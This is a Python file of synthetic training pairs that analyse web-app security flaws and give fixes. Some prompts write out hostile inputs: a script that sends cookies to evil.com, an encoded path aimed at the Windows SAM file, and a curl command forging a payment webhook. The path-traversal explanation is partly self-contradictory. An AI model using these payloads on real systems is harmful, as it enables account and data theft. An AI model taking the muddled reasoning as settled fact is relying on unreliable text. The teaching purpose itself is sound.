"""Phase 1B: Foundation Thinking — Security Analysis (Part 4/4)
Business logic flaws, authorization bypasses, and security architecture."""

PAIRS = [
    (
        "thinking/security-business-logic-price-manipulation",
        "An e-commerce API lets the client send the price in the checkout request. An attacker bought items for $0.01:\n\n```python\n@app.route('/api/checkout', methods=['POST'])\n@login_required\ndef checkout():\n    items = request.json['items']\n    total = sum(item['price'] * item['quantity'] for item in items)\n    \n    charge = stripe.Charge.create(\n        amount=int(total * 100),  # Cents\n        currency='usd',\n        source=request.json['payment_token'],\n    )\n    \n    if charge['status'] == 'succeeded':\n        for item in items:\n            create_order_item(\n                user_id=current_user.id,\n                product_id=item['product_id'],\n                quantity=item['quantity'],\n                price=item['price'],\n            )\n        return jsonify(order_id=charge['id'])\n```\n\nAttacker payload: `{\"items\": [{\"product_id\": 42, \"quantity\": 1, \"price\": 0.01}], \"payment_token\": \"tok_xxx\"}`",
        r'''<think>
Classic business logic flaw — trusting client-supplied prices. The server uses `item['price']` from the request body instead of looking up the actual price from the database. The attacker sets the price to $0.01 for a $999 item.

Fix: always look up prices server-side. Never trust financial values from the client.
</think>

**Client-controlled price.** The server trusts `item['price']` from the request instead of looking up the actual price. The attacker sets any item's price to $0.01.

## Fix: Server-Side Price Lookup

```python
@app.route('/api/checkout', methods=['POST'])
@login_required
def checkout():
    items = request.json['items']
    order_items = []
    total = 0

    for item in items:
        # Look up real price from database — NEVER trust client
        product = Product.query.get_or_404(item['product_id'])

        if product.stock < item['quantity']:
            return jsonify(error=f'{product.name} out of stock'), 400

        line_total = product.price * item['quantity']
        total += line_total
        order_items.append({
            'product': product,
            'quantity': item['quantity'],
            'price': product.price,  # Server-side price
        })

    charge = stripe.Charge.create(
        amount=int(total * 100),
        currency='usd',
        source=request.json['payment_token'],
    )

    if charge['status'] == 'succeeded':
        for oi in order_items:
            oi['product'].stock -= oi['quantity']
            create_order_item(
                user_id=current_user.id,
                product_id=oi['product'].id,
                quantity=oi['quantity'],
                price=oi['price'],
            )
        db.session.commit()
        return jsonify(order_id=charge['id'])
```

**Rule:** The client sends IDs and quantities. The server looks up prices, applies discounts, and calculates totals. Never trust any financial value from the client — prices, totals, discounts, tax amounts.'''
    ),
    (
        "thinking/security-race-condition-coupon",
        "A discount coupon labeled 'single use' can be used multiple times by sending concurrent requests:\n\n```python\n@app.route('/api/apply-coupon', methods=['POST'])\n@login_required\ndef apply_coupon():\n    code = request.json['code']\n    \n    coupon = db.execute(\n        'SELECT * FROM coupons WHERE code = ? AND used = 0',\n        (code,)\n    ).fetchone()\n    \n    if not coupon:\n        return jsonify(error='Invalid or used coupon'), 400\n    \n    # Apply discount\n    apply_discount(current_user.id, coupon['discount_amount'])\n    \n    # Mark as used\n    db.execute(\n        'UPDATE coupons SET used = 1 WHERE code = ?',\n        (code,)\n    )\n    db.commit()\n    \n    return jsonify(discount=coupon['discount_amount'])\n```\n\nThe attacker sends 50 concurrent requests, all with the same coupon code.",
        r'''<think>
TOCTOU race condition. Between the SELECT (check if used=0) and UPDATE (mark used=1), multiple concurrent requests can all pass the check:

1. Request 1: SELECT → used=0 ✓
2. Request 2: SELECT → used=0 ✓ (not yet updated!)
3. Request 3: SELECT → used=0 ✓
4. Request 1: apply_discount, UPDATE used=1
5. Request 2: apply_discount (coupon already applied but check already passed)
6. Request 3: apply_discount (same)

50 concurrent requests → coupon applied 50 times.

Fix: use database-level locking or atomic UPDATE with row-level check.
</think>

**Race condition between check and update.** All 50 requests read `used=0` before any of them writes `used=1`. Each request independently passes the check and applies the discount.

## Fix: Atomic Check-and-Update

```python
@app.route('/api/apply-coupon', methods=['POST'])
@login_required
def apply_coupon():
    code = request.json['code']

    # Atomic: UPDATE only if used=0, returns affected rows
    result = db.execute(
        'UPDATE coupons SET used = 1, used_by = ?, used_at = NOW() '
        'WHERE code = ? AND used = 0',
        (current_user.id, code)
    )
    db.commit()

    if result.rowcount == 0:
        # Either invalid code or already used — no race window
        return jsonify(error='Invalid or already used coupon'), 400

    coupon = db.execute(
        'SELECT discount_amount FROM coupons WHERE code = ?', (code,)
    ).fetchone()

    apply_discount(current_user.id, coupon['discount_amount'])
    return jsonify(discount=coupon['discount_amount'])
```

**Why this works:** The `UPDATE ... WHERE used = 0` is atomic at the database level. Only ONE of the 50 concurrent requests can successfully update the row. The other 49 see `rowcount=0` and get rejected.

**Alternative: `SELECT ... FOR UPDATE`**
```sql
BEGIN;
SELECT * FROM coupons WHERE code = ? AND used = 0 FOR UPDATE;
-- Row is now locked — other transactions wait
UPDATE coupons SET used = 1 WHERE code = ?;
COMMIT;
```'''
    ),
    (
        "thinking/security-authorization-horizontal-escalation",
        "Users can view their orders at `/api/orders?user_id=123`. An attacker changed the user_id parameter:\n\n```python\n@app.route('/api/orders')\n@login_required\ndef list_orders():\n    user_id = request.args.get('user_id', current_user.id)\n    orders = Order.query.filter_by(user_id=user_id).all()\n    return jsonify([o.to_dict() for o in orders])\n\n@app.route('/api/orders/<int:order_id>', methods=['PUT'])\n@login_required\ndef update_order(order_id):\n    order = Order.query.get_or_404(order_id)\n    order.shipping_address = request.json.get('shipping_address', order.shipping_address)\n    db.session.commit()\n    return jsonify(order.to_dict())\n```\n\nBoth endpoints have authorization flaws. Identify and fix them.",
        r'''<think>
Two IDOR/horizontal privilege escalation vulnerabilities:

1. `list_orders`: The `user_id` comes from the query parameter, not the session. An attacker sends `?user_id=456` to see another user's orders.

2. `update_order`: Gets the order by ID but never checks if the order belongs to the current user. An attacker can modify any user's order.

Fix: always scope queries to the authenticated user.
</think>

## Vulnerability 1: `list_orders` — User ID from Query Parameter
```
GET /api/orders?user_id=456  → See anyone's orders
```
The `user_id` is taken from the URL, not the session. Attacker views any user's orders.

## Vulnerability 2: `update_order` — No Ownership Check
```
PUT /api/orders/789 {"shipping_address": "attacker's address"}
```
No check that the order belongs to the current user. Attacker redirects anyone's shipment.

## Fix: Always Scope to Authenticated User

```python
@app.route('/api/orders')
@login_required
def list_orders():
    # IGNORE user_id param — always use session user
    orders = Order.query.filter_by(user_id=current_user.id).all()
    return jsonify([o.to_dict() for o in orders])

@app.route('/api/orders/<int:order_id>', methods=['PUT'])
@login_required
def update_order(order_id):
    # Scope query to current user — 404 if they don't own it
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id
    ).first_or_404()

    order.shipping_address = request.json.get('shipping_address', order.shipping_address)
    db.session.commit()
    return jsonify(order.to_dict())
```

**Pattern:** Every database query touching user data should include `user_id=current_user.id` in the WHERE clause. The authenticated user's identity comes from the session, never from request parameters.'''
    ),
    (
        "thinking/security-insecure-password-reset",
        "A password reset flow has multiple vulnerabilities:\n\n```python\nimport random\nimport time\n\n@app.route('/api/forgot-password', methods=['POST'])\ndef forgot_password():\n    email = request.json['email']\n    user = User.query.filter_by(email=email).first()\n    \n    if not user:\n        return jsonify(error='No account with that email'), 404\n    \n    # Generate 6-digit code\n    code = str(random.randint(100000, 999999))\n    \n    db.execute(\n        'INSERT INTO reset_codes (user_id, code) VALUES (?, ?)',\n        (user.id, code)\n    )\n    db.commit()\n    send_email(email, f'Your reset code is: {code}')\n    \n    return jsonify(message='Code sent')\n\n@app.route('/api/reset-password', methods=['POST'])\ndef reset_password():\n    email = request.json['email']\n    code = request.json['code']\n    new_password = request.json['new_password']\n    \n    user = User.query.filter_by(email=email).first()\n    reset = db.execute(\n        'SELECT * FROM reset_codes WHERE user_id = ? AND code = ?',\n        (user.id, code)\n    ).fetchone()\n    \n    if reset:\n        user.password_hash = hash_password(new_password)\n        db.execute('DELETE FROM reset_codes WHERE user_id = ?', (user.id,))\n        db.commit()\n        return jsonify(message='Password reset successfully')\n    \n    return jsonify(error='Invalid code'), 400\n```\n\nIdentify all vulnerabilities.",
        r'''<think>
Multiple issues:

1. **User enumeration** — "No account with that email" reveals whether an email is registered. Attackers enumerate valid accounts.

2. **Weak random** — `random.randint` is not cryptographically secure. Predictable with Mersenne Twister state recovery.

3. **6-digit code** — only 900,000 possibilities. Brute-forceable in minutes without rate limiting.

4. **No rate limiting** — attacker can try all 900,000 codes for the reset endpoint.

5. **No expiration** — reset codes never expire. Old codes remain valid forever.

6. **No attempt limiting** — no lockout after N failed code attempts.

7. **Old codes not invalidated** — requesting multiple codes creates multiple valid entries. All remain usable.
</think>

## Seven Vulnerabilities

1. **User enumeration** — "No account with that email" reveals registered emails
2. **`random.randint` not cryptographic** — predictable PRNG
3. **6-digit code** — only 900K possibilities, brute-forceable
4. **No rate limiting** on code verification
5. **No expiration** — codes valid forever
6. **No attempt limit** — unlimited guesses per code
7. **Multiple valid codes** — old codes never invalidated

## Fix

```python
import secrets
import time
import hashlib

MAX_ATTEMPTS = 5
CODE_EXPIRY = 600  # 10 minutes

@app.route('/api/forgot-password', methods=['POST'])
def forgot_password():
    email = request.json['email']
    user = User.query.filter_by(email=email).first()

    # ALWAYS return same response — prevent enumeration
    if user:
        # Invalidate old codes
        db.execute('DELETE FROM reset_codes WHERE user_id = ?', (user.id,))

        # Cryptographic random, longer code
        code = secrets.token_urlsafe(32)

        # Store hash of code (not plaintext — DB compromise doesn't expose codes)
        code_hash = hashlib.sha256(code.encode()).hexdigest()
        db.execute(
            'INSERT INTO reset_codes (user_id, code_hash, expires_at, attempts) '
            'VALUES (?, ?, ?, 0)',
            (user.id, code_hash, time.time() + CODE_EXPIRY)
        )
        db.commit()

        # Send full URL with token (not just a code to type)
        reset_url = f'https://app.com/reset?token={code}&email={email}'
        send_email(email, f'Reset your password: {reset_url}')

    # Same response regardless of whether user exists
    return jsonify(message='If that email exists, a reset link has been sent')

@app.route('/api/reset-password', methods=['POST'])
def reset_password():
    token = request.json['token']
    email = request.json['email']
    new_password = request.json['new_password']

    user = User.query.filter_by(email=email).first()
    if not user:
        return jsonify(error='Invalid or expired token'), 400

    token_hash = hashlib.sha256(token.encode()).hexdigest()
    reset = db.execute(
        'SELECT * FROM reset_codes WHERE user_id = ? AND code_hash = ? '
        'AND expires_at > ? AND attempts < ?',
        (user.id, token_hash, time.time(), MAX_ATTEMPTS)
    ).fetchone()

    if not reset:
        # Increment attempt counter
        db.execute(
            'UPDATE reset_codes SET attempts = attempts + 1 WHERE user_id = ?',
            (user.id,)
        )
        db.commit()
        return jsonify(error='Invalid or expired token'), 400

    user.password_hash = hash_password(new_password)
    db.execute('DELETE FROM reset_codes WHERE user_id = ?', (user.id,))
    # Invalidate all sessions
    db.execute('DELETE FROM sessions WHERE user_id = ?', (user.id,))
    db.commit()

    return jsonify(message='Password reset successfully')
```'''
    ),
    (
        "thinking/security-integer-overflow-payment",
        "A payment system stores amounts as 32-bit integers (cents). An attacker triggered a negative charge:\n\n```python\nimport struct\n\ndef process_payment(amount_dollars: float) -> int:\n    amount_cents = int(amount_dollars * 100)\n    # Store as signed 32-bit integer\n    packed = struct.pack('i', amount_cents)\n    stored = struct.unpack('i', packed)[0]\n    \n    if stored <= 0:\n        raise ValueError('Amount must be positive')\n    \n    charge_card(stored)\n    return stored\n\n# What happens with: process_payment(21474836.48)?\n```",
        r'''<think>
21474836.48 * 100 = 2147483648 cents = 2^31, which overflows a signed 32-bit integer.

`struct.pack('i', 2147483648)` — 'i' is signed 32-bit. 2^31 in signed 32-bit is -2^31 = -2147483648. Wait, actually Python's struct will raise an `OverflowError` for values outside the signed 32-bit range.

Actually, `int(21474836.48 * 100)` = 2147483648 (if float precision allows). `struct.pack('i', 2147483648)` would raise `struct.error: 'i' format requires -2147483648 <= number <= 2147483647`.

Hmm, but the question implies it works and creates a negative charge. Maybe with `amount_dollars = 21474836.47`:
- 21474836.47 * 100 = 2147483647.0 → fits in signed 32-bit (INT_MAX)
- But 21474836.48 * 100 = 2147483648.0 → overflows

In Python, struct.pack would error. But in C or if using ctypes, the overflow wraps to -2147483648.

For the training pair, the concept is integer overflow in payment systems — even if Python's struct catches it, the lesson is about validating financial values before they hit storage boundaries.

Let me adjust to show the C-level danger and the Python validation needed.
</think>

`21474836.48 * 100 = 2,147,483,648` cents = `2^31`, which overflows signed 32-bit integer to `-2,147,483,648`. Python's `struct.pack('i', ...)` would raise an error, but in C, databases, or languages with implicit overflow, this wraps to negative — the attacker gets credited instead of charged.

## The Attack

```
$21,474,836.48 → 2,147,483,648 cents → signed 32-bit overflow → -2,147,483,648
```

The check `stored <= 0` catches the overflow AFTER it happens — but in some systems, the charge has already been submitted.

## Fix: Validate Before Any Conversion

```python
from decimal import Decimal

MAX_AMOUNT_DOLLARS = Decimal('999999.99')  # Business limit
MIN_AMOUNT_DOLLARS = Decimal('0.01')

def process_payment(amount_str: str) -> int:
    # Use Decimal for exact arithmetic (no float)
    try:
        amount = Decimal(amount_str)
    except Exception:
        raise ValueError('Invalid amount format')

    # Business validation BEFORE any conversion
    if amount < MIN_AMOUNT_DOLLARS:
        raise ValueError(f'Amount must be >= {MIN_AMOUNT_DOLLARS}')
    if amount > MAX_AMOUNT_DOLLARS:
        raise ValueError(f'Amount must be <= {MAX_AMOUNT_DOLLARS}')
    if amount.as_tuple().exponent < -2:
        raise ValueError('Amount cannot have more than 2 decimal places')

    amount_cents = int(amount * 100)

    # Sanity check (defense in depth)
    if not (1 <= amount_cents <= 99_999_999):
        raise ValueError('Amount out of safe range')

    charge_card(amount_cents)
    return amount_cents
```

**Key defenses:**
1. Accept string input → Decimal (never float for money)
2. Validate business limits BEFORE conversion
3. Defense-in-depth range check on the final integer
4. Use 64-bit integers for storage (`BIGINT`) to avoid overflow'''
    ),
    (
        "thinking/security-api-key-exposure-client-side",
        "A frontend developer embedded API keys in the JavaScript bundle:\n\n```javascript\n// src/config.js\nexport const config = {\n    STRIPE_SECRET_KEY: 'sk_live_xxxxx',  // SECRET key!\n    OPENAI_API_KEY: 'sk-xxxxx',\n    DATABASE_URL: 'postgresql://admin:pass@db.internal/myapp',\n    STRIPE_PUBLISHABLE_KEY: 'pk_live_xxxxx',  // This one is OK\n};\n\n// src/payment.js\nimport { config } from './config';\n\nasync function chargeCustomer(amount) {\n    const response = await fetch('https://api.stripe.com/v1/charges', {\n        method: 'POST',\n        headers: {\n            'Authorization': `Bearer ${config.STRIPE_SECRET_KEY}`,\n        },\n        body: `amount=${amount}&currency=usd`,\n    });\n}\n```",
        r'''<think>
Client-side code is visible to everyone. The JavaScript bundle is downloaded by browsers and can be deobfuscated. All secrets in the bundle are compromised:

- STRIPE_SECRET_KEY → charge/refund any amount on the company's Stripe account
- OPENAI_API_KEY → run up API bills, access any data sent through the key
- DATABASE_URL → direct database access if the DB is exposed

Only STRIPE_PUBLISHABLE_KEY is designed to be client-side (it's "publishable" by design — it can only create tokens, not charges).
</think>

**All client-side JavaScript is visible to users.** Anyone can open DevTools → Sources and read every secret. The JavaScript bundle is downloaded to the browser — obfuscation doesn't help.

## What's Exposed

| Key | Exposure Impact |
|-----|----------------|
| `STRIPE_SECRET_KEY` | Charge/refund any amount on your account |
| `OPENAI_API_KEY` | Run up unlimited API costs |
| `DATABASE_URL` | Direct database access (if exposed to internet) |
| `STRIPE_PUBLISHABLE_KEY` | Safe — designed for client-side use |

## Fix: Secrets Stay Server-Side

```javascript
// Frontend — only publishable keys
export const config = {
    STRIPE_PUBLISHABLE_KEY: 'pk_live_xxxxx',  // OK — designed for browsers
    API_BASE_URL: '/api',
};

// Payment goes through YOUR backend
async function chargeCustomer(amount, paymentMethodId) {
    const response = await fetch('/api/charge', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, payment_method: paymentMethodId }),
    });
    return response.json();
}
```

```python
# Backend — secrets stay here
@app.route('/api/charge', methods=['POST'])
@login_required
def charge():
    data = request.json
    charge = stripe.Charge.create(
        amount=data['amount'],
        currency='usd',
        payment_method=data['payment_method'],
        api_key=os.environ['STRIPE_SECRET_KEY'],  # Server-side only
    )
    return jsonify(charge)
```

**Rule:** If a key has "secret", "private", or "sk_" in its name, it NEVER goes in frontend code. Client → your backend → third-party API. Your backend is the gatekeeper.'''
    ),
    (
        "thinking/security-webhook-verification",
        "Our Stripe webhook endpoint processes payment events without verifying they actually came from Stripe:\n\n```python\n@app.route('/webhooks/stripe', methods=['POST'])\ndef stripe_webhook():\n    event = request.json\n    \n    if event['type'] == 'checkout.session.completed':\n        session = event['data']['object']\n        fulfill_order(session['id'], session['customer_email'])\n    elif event['type'] == 'payment_intent.succeeded':\n        activate_subscription(event['data']['object']['customer'])\n    \n    return jsonify(received=True)\n```\n\nAn attacker can POST fake events to trigger order fulfillment without paying.",
        r'''<think>
No webhook signature verification. Anyone who knows the URL can send fake events. The attacker sends:
```json
{"type": "checkout.session.completed", "data": {"object": {"id": "fake", "customer_email": "attacker@evil.com"}}}
```

The server fulfills an order without any payment. Fix: verify the Stripe signature header.
</think>

**No webhook signature verification.** Anyone can POST fake events to your endpoint:

```bash
curl -X POST https://yourapp.com/webhooks/stripe \
  -H 'Content-Type: application/json' \
  -d '{"type":"checkout.session.completed","data":{"object":{"id":"fake","customer_email":"attacker@evil.com"}}}'
```

Free products, activated subscriptions — all without paying.

## Fix: Verify Webhook Signature

```python
import stripe

WEBHOOK_SECRET = os.environ['STRIPE_WEBHOOK_SECRET']

@app.route('/webhooks/stripe', methods=['POST'])
def stripe_webhook():
    payload = request.get_data()
    sig_header = request.headers.get('Stripe-Signature')

    try:
        # Verify the event came from Stripe using their signing secret
        event = stripe.Webhook.construct_event(
            payload, sig_header, WEBHOOK_SECRET
        )
    except ValueError:
        return jsonify(error='Invalid payload'), 400
    except stripe.error.SignatureVerificationError:
        return jsonify(error='Invalid signature'), 400

    # Event is verified — safe to process
    if event['type'] == 'checkout.session.completed':
        session = event['data']['object']
        fulfill_order(session['id'], session['customer_email'])
    elif event['type'] == 'payment_intent.succeeded':
        activate_subscription(event['data']['object']['customer'])

    return jsonify(received=True)
```

**Every webhook from external services (Stripe, GitHub, Twilio, etc.) must be signature-verified.** The signing secret is shared between you and the service — an attacker can't forge a valid signature.'''
    ),
    (
        "thinking/security-path-traversal-windows",
        "A file serving endpoint on Windows is vulnerable to path traversal even though it checks for `../`:\n\n```python\nimport os\n\n@app.route('/api/files/<path:filename>')\ndef serve_file(filename):\n    # Block path traversal\n    if '..' in filename or filename.startswith('/'):\n        abort(400)\n    \n    filepath = os.path.join('C:\\\\app\\\\uploads', filename)\n    return send_file(filepath)\n```\n\nThe attacker accessed `C:\\Windows\\System32\\config\\SAM` using: `/api/files/..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CSAM`",
        r'''<think>
On Windows, both `/` and `\\` are path separators. `%5C` is URL-encoded backslash `\\`. The check only looks for `..` followed by `/`, but `..\\` also traverses directories on Windows.

The decoded path: `..\..\..\\Windows\\System32\\config\\SAM`

`'..' in filename` does catch `..` — wait, `..%5C` decoded is `..\`. The string `..` IS in `..\`, so `'..' in filename` should catch it if Flask decodes the URL first.

But Flask's `<path:filename>` does URL decode the percent-encoding. So `..%5C` becomes `..\`. And `'..' in '..\\'` is True. Hmm.

Actually, the issue might be: `%5C` is decoded by the web server/framework to `\`, and then `..` check catches it. But if the web server doesn't decode `%5C` (treats it as a literal path component), or if the check runs before decoding...

Actually, some WSGI servers normalize `%5C` differently. And on Windows, `os.path.join('C:\\app\\uploads', '..\\..\\Windows')` traverses up.

The real bypass could be: `....//` or `/api/files/....%5C....%5CWindows` where `....` contains `..` embedded. Or using Windows device names like `CON`, `NUL`, etc.

For the training pair, the key lesson is: always use `realpath` to resolve the final path and verify it's within the allowed directory, don't rely on string-matching checks.
</think>

On Windows, `%5C` decodes to `\` (backslash path separator). Depending on the WSGI server's URL normalization, the `..` check may be bypassed. Additionally, Windows has many path tricks:

- `..%5C` → `..\` (backslash traversal)
- `..%252F` → double-encoded, decoded in two passes
- `filename.txt::$DATA` → NTFS alternate data streams
- `CON`, `NUL`, `AUX` → reserved device names

## Fix: Resolve and Validate the Final Path

```python
import os

UPLOAD_DIR = os.path.realpath('C:\\app\\uploads')

@app.route('/api/files/<path:filename>')
def serve_file(filename):
    # Join and resolve to absolute path (follows symlinks, resolves ..)
    filepath = os.path.realpath(os.path.join(UPLOAD_DIR, filename))

    # Verify resolved path is inside upload directory
    if not filepath.startswith(UPLOAD_DIR + os.sep):
        abort(403)

    # Verify file exists (not a directory)
    if not os.path.isfile(filepath):
        abort(404)

    return send_file(filepath)
```

**Don't use string matching (`..` check) for path security.** Always:
1. `os.path.realpath()` to resolve the FINAL path
2. Verify it starts with the allowed directory + separator
3. This handles ALL traversal tricks on ALL platforms'''
    ),
    (
        "thinking/security-content-type-sniffing",
        "An image upload feature is being exploited to serve HTML/JavaScript. Users upload a file with `.jpg` extension but containing HTML:\n\n```python\n@app.route('/uploads/<filename>')\ndef serve_upload(filename):\n    return send_from_directory('uploads', filename)\n```\n\nThe uploaded file `photo.jpg` contains:\n```html\n<html><script>document.location='https://evil.com/?c='+document.cookie</script></html>\n```\n\nWhen another user views `https://app.com/uploads/photo.jpg`, their browser runs the script.",
        r'''<think>
Content-type sniffing (MIME sniffing). The browser looks at the file content, sees HTML, and renders it as HTML despite the .jpg extension. Without the `X-Content-Type-Options: nosniff` header, browsers try to be "helpful" by detecting the actual content type.

If the server doesn't set `Content-Type: image/jpeg` explicitly, or the browser ignores it due to sniffing, the HTML content executes as a page on the app's origin — giving the script access to the app's cookies.
</think>

**MIME sniffing.** Browsers examine file content and may render it as HTML regardless of the file extension. The script runs on your domain's origin, accessing your cookies.

## Fix: Correct Headers + Content Validation

```python
import mimetypes
import magic  # python-magic library

ALLOWED_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}

@app.route('/uploads/<filename>')
def serve_upload(filename):
    filepath = os.path.join('uploads', filename)

    # Detect actual content type from file bytes (not extension)
    actual_type = magic.from_file(filepath, mime=True)
    if actual_type not in ALLOWED_TYPES:
        abort(403)

    response = send_from_directory('uploads', filename)

    # Set correct Content-Type based on actual content
    response.headers['Content-Type'] = actual_type

    # Prevent browser from sniffing a different type
    response.headers['X-Content-Type-Options'] = 'nosniff'

    # Prevent framing (clickjacking)
    response.headers['X-Frame-Options'] = 'DENY'

    # Force download for non-image routes
    # response.headers['Content-Disposition'] = 'attachment'

    return response
```

**Also validate on upload:**
```python
def validate_upload(file):
    # Check magic bytes, not just extension
    header = file.read(32)
    file.seek(0)
    mime = magic.from_buffer(header, mime=True)
    if mime not in ALLOWED_TYPES:
        raise ValueError(f'Invalid file type: {mime}')
```

**Defense layers:** validate content type on upload (magic bytes, not extension), set correct `Content-Type` header, add `X-Content-Type-Options: nosniff`, serve user uploads from a separate domain (e.g., `uploads.yourapp.com`) to isolate cookies.'''
    ),
    (
        "thinking/security-account-takeover-email-change",
        "An account takeover attack exploits the email change flow. The attacker changes the victim's email address and then uses 'forgot password' to set a new password:\n\n```python\n@app.route('/api/account/email', methods=['PUT'])\n@login_required\ndef change_email():\n    new_email = request.json['email']\n    current_user.email = new_email\n    db.session.commit()\n    return jsonify(message='Email updated')\n```\n\nThe attacker has the victim's session (via XSS, session hijacking, etc). What's wrong with this flow?",
        r'''<think>
No verification of the email change:
1. No confirmation sent to the OLD email (so the real owner doesn't know)
2. No confirmation sent to the NEW email (to verify ownership)
3. No re-authentication required (password confirmation)
4. Immediate change — no delay or review period
5. After changing email, the attacker uses "forgot password" on the new email → full account takeover

This is a common attack chain: XSS → steal session → change email → password reset → full takeover.
</think>

**Email change without verification = instant account takeover.** With a stolen session, the attacker:
1. Changes email to `attacker@evil.com` (no confirmation needed)
2. Uses "forgot password" for the new email
3. Sets a new password → full account takeover
4. The real owner can't recover — their email is no longer associated

## Fix: Multi-Step Email Change with Verification

```python
@app.route('/api/account/email', methods=['PUT'])
@login_required
def request_email_change():
    new_email = request.json['email']
    password = request.json['password']  # Require re-authentication

    # Step 1: Verify current password
    if not verify_password(password, current_user.password_hash):
        return jsonify(error='Invalid password'), 403

    # Step 2: Check new email isn't taken
    if User.query.filter_by(email=new_email).first():
        return jsonify(error='Email already in use'), 409

    # Step 3: Send verification to NEW email (don't change yet!)
    token = secrets.token_urlsafe(32)
    db.execute(
        'INSERT INTO email_changes (user_id, new_email, token, expires_at) '
        'VALUES (?, ?, ?, ?)',
        (current_user.id, new_email, hash_token(token), time.time() + 3600)
    )
    db.commit()

    send_email(new_email, f'Confirm email change: https://app.com/confirm-email?token={token}')

    # Step 4: Notify OLD email
    send_email(
        current_user.email,
        'Someone requested to change your email. If this was not you, '
        'change your password immediately.'
    )

    return jsonify(message='Verification sent to new email')

@app.route('/api/account/confirm-email', methods=['POST'])
def confirm_email_change():
    token = request.json['token']
    change = db.execute(
        'SELECT * FROM email_changes WHERE token_hash = ? AND expires_at > ?',
        (hash_token(token), time.time())
    ).fetchone()

    if not change:
        return jsonify(error='Invalid or expired token'), 400

    user = User.query.get(change['user_id'])
    user.email = change['new_email']
    db.execute('DELETE FROM email_changes WHERE user_id = ?', (user.id,))
    db.commit()

    return jsonify(message='Email changed successfully')
```

**Defense layers:** re-authentication (password), verification email to new address, notification to old address, time-limited token.'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
